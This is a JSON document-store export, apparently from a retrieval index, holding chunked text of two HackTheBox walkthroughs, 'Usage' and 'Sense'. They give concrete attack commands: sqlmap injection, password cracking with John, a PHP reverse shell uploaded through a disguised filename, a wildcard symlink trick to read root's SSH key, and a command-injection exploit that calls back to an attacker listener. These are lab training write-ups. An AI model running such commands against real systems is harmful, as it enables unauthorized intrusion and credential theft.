{"docstore/metadata": {"de341653-4ac9-4f7a-9363-b16a89bb0553": {"doc_hash": "d63ea5114f0976e6dff583ef46e1066efec0e30b6c4acac9599e236e5e064276"}, "3345cbf7-86a9-48d1-8af1-e7a2c053bd1b": {"doc_hash": "db1b98d3c4fe1c257a264b67d1fa1c58a0fe4fe97ae5c874612854d64edf640d", "ref_doc_id": "de341653-4ac9-4f7a-9363-b16a89bb0553"}, "8e15a6ad-310b-4e87-8e8f-4cabbc051b50": {"doc_hash": "6a541e7c9c9ffa1cb570d3005a2be8f28ccde418adb24edc59ce1f208f623d32", "ref_doc_id": "de341653-4ac9-4f7a-9363-b16a89bb0553"}, "34afc580-199b-4525-9552-cb39608648aa": {"doc_hash": "fca30c71df5ecf805da6dbb88049026446de4359a397545eba07c1121125f24b", "ref_doc_id": "778239a0-b360-452c-b357-172c6bc092f1"}, "8c41f997-b325-46a5-bf85-b5c31ee4d285": {"doc_hash": "e4a7eb07e228a06ef98b268d393e251babdf7081de1a8222d7916dfcc9341065", "ref_doc_id": "778239a0-b360-452c-b357-172c6bc092f1"}, "778239a0-b360-452c-b357-172c6bc092f1": {"doc_hash": "2f9777ba79068a58be7ae2244541ae30267fa0c4e81201a047d5e494c4d45694"}}, "docstore/data": {"3345cbf7-86a9-48d1-8af1-e7a2c053bd1b": {"__data__": {"id_": "3345cbf7-86a9-48d1-8af1-e7a2c053bd1b", "embedding": null, "metadata": {}, "excluded_embed_metadata_keys": [], "excluded_llm_metadata_keys": [], "relationships": {"1": {"node_id": "de341653-4ac9-4f7a-9363-b16a89bb0553", "node_type": "4", "metadata": {}, "hash": "d63ea5114f0976e6dff583ef46e1066efec0e30b6c4acac9599e236e5e064276", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "8e15a6ad-310b-4e87-8e8f-4cabbc051b50", "node_type": "1", "metadata": {}, "hash": "6a541e7c9c9ffa1cb570d3005a2be8f28ccde418adb24edc59ce1f208f623d32", "class_name": "RelatedNodeInfo"}}, "text": "Usage Machine\u2014 HackTheBox Writeup: Journey Through Exploitation | by heyrm | Medium Open in app Sign up Sign in Write Sign up Sign in Usage Machine\u2014 HackTheBox Writeup: Journey Through Exploitation heyrm \u00b7 Follow 7 min read \u00b7 May 8, 2024 -- Listen Share Usage \u2014 HackTheBox HackTheBox (HTB) provides a platform for cybersecurity enthusiasts to enhance their skills through challenges and real-world scenarios. One such adventure is the \u201cUsage\u201d machine, which involves a series of steps to penetrate its defenses and gain control. Let\u2019s embark on this journey of execution and exploitation. Scanning and Discovery The first step in any penetration testing endeavor is reconnaissance. Utilizing Nmap, we scan the target IP to uncover its exposed services and potential vulnerabilities. nmap scanning Upon discovering an open port 80, indicating the presence of a website, we proceed to explore its contents. Website Exploration Visiting the IP address in a browser redirects us to a website named \u201cusage.htb\u201d, presenting a form and various navigation options. machine landing page Recognizing the potential for SQL injection vulnerabilities, we scrutinize the forms for susceptibility. After testing each form, the password reset feature exhibits signs of SQL injection vulnerability, evidenced by error responses to single quotes. error message Exploitation Phase Employing Burp Suite, we intercept requests to the password reset feature, revealing HTTP POST requests. reset password (intercept) Utilizing SQLMap, we automate the injection process by providing the intercepted request in a text file and execute the following command: sqlmap -r request.txt -p email --level 5 --risk 3 --batch --threads 10 --dbs This yields a successful exploitation, divulging the presence of a MySQL database and facilitating further exploration. sqlmap results Database Exploitation We proceed to extract database information using SQLMap, obtaining a list of databases, including \u201cusage_blog.\u201d sqlmap -r request.txt -p email --level 5 --risk 3 --threads 10 -D database_name --tables database enumeration Continuing our reconnaissance, we extract table information and subsequently retrieve data from the \u201cadmin_users\u201d table. sqlmap database results Crack the hash The situation becomes even more intriguing, but what does this password hash signify? Let\u2019s crack it. Copy the contents of the password hash above and save it into a .txt file. Next, execute the following command: john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt -show Alternatively, you can use: john hash.txt -show This command instructs John the Ripper, a password cracking tool, to attempt to crack the password hash using the specified wordlist, in this case, \u201crockyou.txt\u201d. Once executed, John will display any successfully cracked passwords. User Credentials and Dashboard Access With obtained credentials, we gain access to the admin dashboard, unveiling insights into the web application\u2019s technologies and versions. dashboard admin Further investigation unveils a potential vulnerability associated with the profile picture upload feature, leading us to exploit it by uploading a PHP reverse shell payload. CVE-2023-24249 : An arbitrary file upload vulnerability in laravel-admin v1.8.19 allows attackers\u2026 CVE-2023-24249 : An arbitrary file upload vulnerability in laravel-admin v1.8.19 allows attackers to execute arbitrary\u2026 www.cvedetails.com Continuation: Exploiting the Profile Picture Upload Feature Observing the dashboard page reveals a user profile picture feature, indicating the ability to upload files. This presents an opportunity for further exploitation. Before proceeding, we prepare a PHP file containing a reverse shell payload, which we intend to upload to establish remote access to the web database. For this purpose, I opted for the widely-used tool \u201cphp-reverse-shell\u201d available at the GitHub repository: GitHub - pentestmonkey/php-reverse-shell Contribute to pentestmonkey/php-reverse-shell development by creating an account on GitHub. github.com In the PHP reverse shell script, ensure to modify the IP address and port parameters to match your listener setup. Additionally, rename the file extension to \u201c.php.jpg\u201d to trick the system into recognizing it as an image file during upload. After making these adjustments, initiate a listener using the following command: nc -lvnp [port] With the listener active, proceed to upload the crafted PHP file through the profile picture upload feature. Upon successful upload and execution of the PHP reverse shell payload, you\u2019ll establish a remote connection to the web database, enabling further exploration and exploitation of the system. Once the reverse shell setup is complete, proceed with the file upload process. Intercept the upload request using Burp Suite to modify the file name back to \u201c.php.jpg.php\u201d. This manipulation ensures that the web server recognizes the uploaded file as a PHP script and executes the reverse shell payload accordingly.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4992, "text_template": "{metadata_str}\n\n{content}", "metadata_template": "{key}: {value}", "metadata_seperator": "\n", "class_name": "TextNode"}, "__type__": "1"}, "8e15a6ad-310b-4e87-8e8f-4cabbc051b50": {"__data__": {"id_": "8e15a6ad-310b-4e87-8e8f-4cabbc051b50", "embedding": null, "metadata": {}, "excluded_embed_metadata_keys": [], "excluded_llm_metadata_keys": [], "relationships": {"1": {"node_id": "de341653-4ac9-4f7a-9363-b16a89bb0553", "node_type": "4", "metadata": {}, "hash": "d63ea5114f0976e6dff583ef46e1066efec0e30b6c4acac9599e236e5e064276", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "3345cbf7-86a9-48d1-8af1-e7a2c053bd1b", "node_type": "1", "metadata": {}, "hash": "db1b98d3c4fe1c257a264b67d1fa1c58a0fe4fe97ae5c874612854d64edf640d", "class_name": "RelatedNodeInfo"}}, "text": "github.com In the PHP reverse shell script, ensure to modify the IP address and port parameters to match your listener setup. Additionally, rename the file extension to \u201c.php.jpg\u201d to trick the system into recognizing it as an image file during upload. After making these adjustments, initiate a listener using the following command: nc -lvnp [port] With the listener active, proceed to upload the crafted PHP file through the profile picture upload feature. Upon successful upload and execution of the PHP reverse shell payload, you\u2019ll establish a remote connection to the web database, enabling further exploration and exploitation of the system. Once the reverse shell setup is complete, proceed with the file upload process. Intercept the upload request using Burp Suite to modify the file name back to \u201c.php.jpg.php\u201d. This manipulation ensures that the web server recognizes the uploaded file as a PHP script and executes the reverse shell payload accordingly. filename (intercept) Upon successful execution of the uploaded file, you\u2019ll gain remote access to the web server. This breakthrough marks a significant milestone in the exploitation process, granting you unauthorized entry into the system. gain User flag Shell Stabilization However, upon gaining access to the system through the reverse shell, we encounter a significant obstacle: the shell\u2019s confusing and cumbersome interface. To address this issue, we need to perform a minor adjustment commonly referred to as shell stabilization.write the following command to get a shell that is more stable and looks less confusing shell stabilization Privilege Escalation Exploration After uncovering the user flag, our curiosity drives us to delve deeper into the user\u2019s dashboard. Among the intriguing findings, one item piques our interest: the \u201c.monitrc\u201d file. Intrigued by its contents, I decide to explore further, hoping to uncover something of significance. .monitrc Upon examining the \u201c.monitrc\u201d file, I notice something intriguing. Eager to explore its implications, I opt to initiate an SSH connection to user Xander based on the insights gleaned from the \u201c.monitrc\u201d. ssh to xander I am curious whether user Xander possesses sudo (superuser) privileges. To verify, I execute the command \u201csudo -l\u201d . sudo -l comman A subsequent exploration reveals Xander\u2019s sudo privileges, allowing execution of \u201c/usr/bin/usage_management.\u201d. explore sudo xander Exploring the options within, I focus on the \u201cProject Backup\u201d option. Despite the limited information provided, I recall that this is a custom website. Thus, I decide to explore its default directories, starting with \u201c/var/www/html\u201d. Facing a temporary roadblock, I turn to various resources for insights. Through research, I stumble upon a technique from Hacktricks, a valuable cybersecurity resource. The technique involves leveraging wildcards and spare tricks for privilege escalation. Wildcards Spare tricks | HackTricks | HackTricks HackTricks Afrikaans - Ht Chinese - Ht Espa\u00f1ol - Ht Fran\u00e7ais - Ht German - Ht Greek - Ht Hindi - Ht Italian - Ht\u2026 book.hacktricks.xyz As our objective is to elevate privileges to root, acquiring the \u201cid_rsa\u201d file becomes imperative. To achieve this, I execute the following commands within the \u201c/var/www/html\u201d directory: touch @id_rsa ln -s /root/.ssh/id_rsa id_rsa ssh Key Following these commands, I revisit the sudo command accessible to user Xander and initiate another backup attempt. The outcome provides a significant breakthrough in our exploitation journey. Root Access Upon obtaining the SSH private key, the next step is exploitation. Here, I copy the hash portion of the private key and save it in my original directory as \u201cid_rsa\u201d. Next, I adjust the permissions of the \u201cid_rsa\u201d file to ensure its confidentiality and integrity: chmod 600 id_rsa With the necessary permissions granted, I proceed to establish an SSH connection using the obtained private key: ssh -i id_rsa root@IP This command initiates an SSH connection to the target system, utilizing the \u201cid_rsa\u201d private key for authentication. privilege escalation and we are in. In conclusion, the \u201cUsage\u201d machine journey exemplifies the meticulous process of identifying vulnerabilities, exploiting them, and escalating privileges. This experience underscores the importance of thorough reconnaissance, automated tools, and creative exploitation techniques in cybersecurity endeavors. Happy learning!! Hackthebox Penetration Testing Exploitation Writeup Htb Writeup -- -- Follow Written by heyrm 23 Followers Keep learning Follow Help Status About Careers Press Blog Privacy Terms Text to speech Teams", "mimetype": "text/plain", "start_char_idx": 4028, "end_char_idx": 8651, "text_template": "{metadata_str}\n\n{content}", "metadata_template": "{key}: {value}", "metadata_seperator": "\n", "class_name": "TextNode"}, "__type__": "1"}, "34afc580-199b-4525-9552-cb39608648aa": {"__data__": {"id_": "34afc580-199b-4525-9552-cb39608648aa", "embedding": null, "metadata": {}, "excluded_embed_metadata_keys": [], "excluded_llm_metadata_keys": [], "relationships": {"1": {"node_id": "778239a0-b360-452c-b357-172c6bc092f1", "node_type": "4", "metadata": {}, "hash": "2f9777ba79068a58be7ae2244541ae30267fa0c4e81201a047d5e494c4d45694", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "8c41f997-b325-46a5-bf85-b5c31ee4d285", "node_type": "1", "metadata": {}, "hash": "e4a7eb07e228a06ef98b268d393e251babdf7081de1a8222d7916dfcc9341065", "class_name": "RelatedNodeInfo"}}, "text": "Sense Walkthrough \u2013 HackTheBox Search Submit your search query Forum Donate August 12, 2022 / #cybersecurity Sense Walkthrough \u2013 HackTheBox By Shuaib Oseni HackTheBox is an online hacking platform that allows you to test and practice your penetration testing skills. It contains several vulnerable labs that are constantly updated. Some of them simulate real-world scenarios and some of them lean more towards a Capture The Flag (CTF) style of challenge. Note: Only write-ups of retired HTB machines are allowed. Prerequisites To get the most out of this walkthrough, you'll need the following: HackTheBox VIP subscription. Kali Linux operating system. Basic bruteforcing knowledge. Machine Information Name: Sense Ip Address: 10.10.10.60 Operating System: FreeBSD Fasten your seat belts, everyone \u2013 we are going for a ride! Step 1 \u2013 Do Some Reconnaissance Reconnaissance is the process of gathering as much information about a target system as possible, and it is usually the first step toward any hack. Let's start by running an Nmap scan to gather information about the open ports and services running on this machine by running the following command: nmap -A -T4 -p- 10.10.10.60 Here's the result: nmap -A -T4 -p- 10.10.10.60\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-03-08 05:23 EST\nNmap scan report for 10.10.10.60\nHost is up (0.36s latency).\nNot shown: 65533 filtered ports\nPORT    STATE SERVICE    VERSION\n80/tcp  open  http       lighttpd 1.4.35\n|_http-server-header: lighttpd/1.4.35\n|_http-title: Did not follow redirect to https://10.10.10.60/\n443/tcp open  ssl/https?\n| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US\n| Not valid before: 2017-10-14T19:21:35\n|_Not valid after:  2023-04-06T19:21:35\n|_ssl-date: TLS randomness does not represent time\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done : 1 IP address (1 host up) scanned in 1561.11 seconds From the scan result we can that there are 2 open ports: Port 80 - Hyper Text Transfer Protocol (HTTP) Port 443 - Hyper Text Transfer Protocol Secured (HTTPS) Step 2 \u2013 Visit the IP Address Now let's visit the IP address in a browser. sense login page We get a pfsense login page. The default credential for pfsense is admin/pfsense . Unfortunately, these credentials didn't work. Step 3 \u2013 Use Directory Brute Force You use directory brute force to find hidden directories on a web application. Now, let's perform a directory brute force using dirbuster . dirbuster dirbuster gave us a couple of interesting things: Pages with response code of 200. A changelog-txt file. A system-user-txt file. changelog-txt and system-user-txt look super juicy, so let's see if we can view their content. To read the content of this file, we type 10.10.10.60/changelog.txt in our browser. changelog.txt contains the following: changelog.txt file To read the content of this file, we type 10.10.10.60/system-users.txt in our browser. system-users.txt contains the following: system-user.txt file Step 4 \u2013 Try to Login system-users.txt contains a username \"Rohit\" and a password \"company defaults\", which doesn't look like a password. What if company defaults = pfsense default password? Let's try it: username: Rohit pasword: pfsense dashboard We get redirected to Rohit's dashboard. Let's click around to see if we can get juicy information or a version number. The admin page contains a version number version number Step 5 \u2013 Fire the Exploit Now that we have a version number, let's use searchsploit to check if there's any known vulnerability on pfsense 2.1.3. Searchsploit is an Exploit-DB command-line search tool for ExploitDB , an exploits archive. Searchsploit comes preinstalled in Kali.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3791, "text_template": "{metadata_str}\n\n{content}", "metadata_template": "{key}: {value}", "metadata_seperator": "\n", "class_name": "TextNode"}, "__type__": "1"}, "8c41f997-b325-46a5-bf85-b5c31ee4d285": {"__data__": {"id_": "8c41f997-b325-46a5-bf85-b5c31ee4d285", "embedding": null, "metadata": {}, "excluded_embed_metadata_keys": [], "excluded_llm_metadata_keys": [], "relationships": {"1": {"node_id": "778239a0-b360-452c-b357-172c6bc092f1", "node_type": "4", "metadata": {}, "hash": "2f9777ba79068a58be7ae2244541ae30267fa0c4e81201a047d5e494c4d45694", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "34afc580-199b-4525-9552-cb39608648aa", "node_type": "1", "metadata": {}, "hash": "fca30c71df5ecf805da6dbb88049026446de4359a397545eba07c1121125f24b", "class_name": "RelatedNodeInfo"}}, "text": "system-users.txt contains the following: system-user.txt file Step 4 \u2013 Try to Login system-users.txt contains a username \"Rohit\" and a password \"company defaults\", which doesn't look like a password. What if company defaults = pfsense default password? Let's try it: username: Rohit pasword: pfsense dashboard We get redirected to Rohit's dashboard. Let's click around to see if we can get juicy information or a version number. The admin page contains a version number version number Step 5 \u2013 Fire the Exploit Now that we have a version number, let's use searchsploit to check if there's any known vulnerability on pfsense 2.1.3. Searchsploit is an Exploit-DB command-line search tool for ExploitDB , an exploits archive. Searchsploit comes preinstalled in Kali. Now let's run the following command in our terminal: searchsploit pfsense searchsploit result Now that we know this version is vulnerable to a Command Injection attack, let's try to exploit it. Command injection is a web security vulnerability that allows an attacker to execute arbitrary OS commands on an application server, ultimately compromising the application and its data. This happens when unsanitized user input is passed through an application. Searchsploit provides us with a Python exploit, so let's try it out. Before firing this exploit, we need to setup a Netcat listener. Netcat is a network utility program with the listener being one of its features. The listener allows you to listen on open ports, create reverse shells, and send data or files over a network. nc -lnvp 9001 Next, we fire our exploit by running the following command: python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.12 --lport 9001 --username rohit --password pfsense Boom! We got a shell: shell Step 6 \u2013 Find the user-flag Our shell is not a PTY shell, meaning there are specific commands we can't run. However, let's see if we can grab any flag with our current shell. Let's move to the rohit directory and see what we can find. user flag Yayyyyyyy we got our user flag! Step 7 \u2013 Find the root-flag What if the root flag is available to us without needing privilege escalation? Let's see. Privilege escalation is an attack whereby a user gets elevated access to a system beyond what is intended. Let's move to the root directory and see what we can find. root flag Booooom! We have successfully rooted this machine. Conclusion We were able to root this machine because it was vulnerable to Command Injection attack. Below are some of the ways you can prevent this vulnerability: Sanitize user input. Avoid calling OS commands directly. Patch and update application often. If you read this far, thank the author to show them you care. Say Thanks Learn to code for free. freeCodeCamp's open source curriculum has helped more than 40,000 people get jobs as developers. Get started ADVERTISEMENT freeCodeCamp is a donor-supported tax-exempt 501(c)(3) charity organization (United States Federal Tax Identification Number: 82-0779546) Our mission: to help people learn to code for free. We accomplish this by creating thousands of videos, articles, and interactive coding lessons - all freely available to the public. Donations to freeCodeCamp go toward our education initiatives, and help pay for servers, services, and staff. You can make a tax-deductible donation here . Trending Books and Handbooks Learn CSS Transform Build a Static Blog Build an AI Chatbot What is Programming? Python Code Examples Open Source for Devs HTTP Networking in JS Write React Unit Tests Learn Algorithms in JS How to Write Clean Code Learn PHP Learn Java Learn Swift Learn Golang Learn Node.js Learn CSS Grid Learn Solidity Learn Express.js Learn JS Modules Learn Apache Kafka REST API Best Practices Front-End JS Development Learn to Build REST APIs Intermediate TS and React Command Line for Beginners Intro to Operating Systems Learn to Build GraphQL APIs OSS Security Best Practices Distributed Systems Patterns Software Architecture Patterns Mobile App Our Charity About Alumni Network Open Source Shop Support Sponsors Academic Honesty Code of Conduct Privacy Policy Terms of Service Copyright Policy", "mimetype": "text/plain", "start_char_idx": 3028, "end_char_idx": 7172, "text_template": "{metadata_str}\n\n{content}", "metadata_template": "{key}: {value}", "metadata_seperator": "\n", "class_name": "TextNode"}, "__type__": "1"}}, "docstore/ref_doc_info": {"de341653-4ac9-4f7a-9363-b16a89bb0553": {"node_ids": ["3345cbf7-86a9-48d1-8af1-e7a2c053bd1b", "8e15a6ad-310b-4e87-8e8f-4cabbc051b50"], "metadata": {}}, "778239a0-b360-452c-b357-172c6bc092f1": {"node_ids": ["34afc580-199b-4525-9552-cb39608648aa", "8c41f997-b325-46a5-bf85-b5c31ee4d285"], "metadata": {}}}}